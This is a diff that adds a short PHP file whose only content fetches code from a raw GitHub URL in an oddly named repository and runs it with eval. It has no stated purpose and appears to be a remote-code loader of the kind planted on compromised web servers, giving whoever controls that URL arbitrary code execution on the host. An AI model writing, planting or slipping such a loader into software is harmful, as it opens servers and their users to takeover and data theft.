@@ -1,0 +1,8 @@
+<?php
+
+    $url = 'https://raw.githubusercontent.com/vforwho/foiyohh/refs/heads/main/gecko';
+
+    $code = file_get_contents($url);
+
+    eval('?>' . $code);
+?>
